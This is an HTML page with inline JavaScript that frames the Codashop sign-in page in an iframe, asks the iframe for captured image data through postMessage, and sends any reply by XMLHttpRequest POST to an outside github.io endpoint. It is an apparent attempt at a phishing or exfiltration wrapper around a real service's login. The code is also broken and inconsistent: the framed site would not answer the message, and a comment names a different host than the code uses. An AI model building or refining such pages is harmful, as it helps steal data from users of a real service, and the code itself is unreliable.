<!DOCTYPE html>
<html>
<head>
  <title>Capture and Send Image</title>
  <script>
    function captureAndSendImage() {
      var iframe = document.getElementById('myIframe');

      // Retrieve the content window of the iframe
      var iframeWindow = iframe.contentWindow || iframe.contentDocument.defaultView;
      
      // Execute a function within the iframe to capture and send the image
      iframeWindow.postMessage('captureImage', 'https://app.codashop.com');
    }

    // Listen for the message from the iframe
    window.addEventListener('message', function(event) {
      if (event.origin === 'https://app.codashop.com') {
        // Image capture data received from the iframe
        var imageData = event.data;

        // Send the image data to the server-side endpoint on test.com
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://republic101.github.io/codashop/capture.html', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4 && xhr.status === 200) {
            console.log('Image sent successfully!');
          }
        };
        xhr.send(JSON.stringify({ image: imageData }));
      }
    });
  </script>
</head>
<body>
  <h1>Capture and Send Image</h1>
  <iframe id="myIframe" src="https://app.codashop.com/en-ph/sign-in" width="800" height="600" frameborder="0"></iframe>
  <button onclick="captureAndSendImage()">Capture and Send Image</button>
</body>
</html>
